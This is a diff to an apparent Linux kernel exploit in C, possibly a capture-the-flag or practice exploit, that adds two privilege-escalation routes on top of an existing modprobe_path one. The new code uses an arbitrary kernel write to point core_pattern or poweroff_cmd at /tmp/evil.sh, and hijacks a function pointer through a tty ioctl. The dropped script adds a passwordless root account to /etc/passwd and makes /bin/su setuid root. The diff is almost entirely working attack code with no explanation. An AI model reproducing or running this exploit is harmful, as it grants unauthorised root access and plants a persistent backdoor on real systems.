@@ -43,6 +43,9 @@
 #define swapgs_restore_regs_and_return_to_usermode                             \
     rebase(0xffffffff81800e10 + 22)
 #define modprobe_path rebase(0xffffffff81e38480)
+#define core_pattern rebase(0xffffffff81eb12e0)
+#define poweroff_cmd rebase(0xffffffff81e37cc0)
+#define poweroff_work_func rebase(0xffffffff81073240)
 
 typedef unsigned long long u64;
 typedef unsigned int u32;
@@ -141,6 +144,50 @@ void overwrite_modprobe_path_privesc() {
     return;
 }
 
+void overwrite_core_pattern_privesc() {
+    aaw32(core_pattern, '|');
+    char cmd[] = "/tmp/evil.sh";
+    for (u64 i = 0; i < sizeof(cmd); i += 4) {
+        aaw32(core_pattern + 1 + i, *(u32 *)&cmd[i]);
+    }
+
+    int fd = open(cmd, O_RDWR | O_CREAT);
+    dprintf(fd, "%s",
+            "#!/bin/sh\n"
+            "echo 'pwned::0:0::/:/bin/sh' >> /etc/passwd\n"
+            "chown root:root /bin/su\n"
+            "chmod +s /bin/su\n");
+    close(fd);
+    if (chmod(cmd, 0777)) {
+        fatal("chmod %s", cmd);
+    }
+    abort();
+    return;
+}
+
+void overwrite_poweroff_cmd_privesc() {
+    char cmd[] = "/tmp/evil.sh";
+    for (u64 i = 0; i < sizeof(cmd); i += 4) {
+        aaw32(poweroff_cmd + i, *(u32 *)&cmd[i]);
+    }
+
+    int fd = open(cmd, O_RDWR | O_CREAT);
+    dprintf(fd, "%s",
+            "#!/bin/sh\n"
+            "echo 'pwned::0:0::/:/bin/sh' >> /etc/passwd\n"
+            "chown root:root /bin/su\n"
+            "chmod +s /bin/su\n");
+    close(fd);
+    if (chmod(cmd, 0777)) {
+        fatal("chmod %s", cmd);
+    }
+    *(u64 *)&buf[0x3f8] = poweroff_work_func;
+    *(u64 *)&buf[0x18] = g_buf_addr + 0x3f8 - 0xc * 8;
+    _write(g_fd, buf, sizeof(buf));
+    ioctl(g_ptmx_fd, 0, 0);
+    return;
+}
+
 void ropchain(int fd) {
     u64 *ptr = (u64 *)buf;
     u64 i = 0;
@@ -235,7 +282,9 @@ int main(int argc, char *argv[]) {
     var(kbase);
     var(g_buf_addr);
     /* rop_privesc(g_fd, g_buf_addr); */
-    overwrite_modprobe_path_privesc();
+    /* overwrite_modprobe_path_privesc(); */
+    overwrite_core_pattern_privesc();
+    /* overwrite_poweroff_cmd_privesc(); */
 
     return 0;
 }
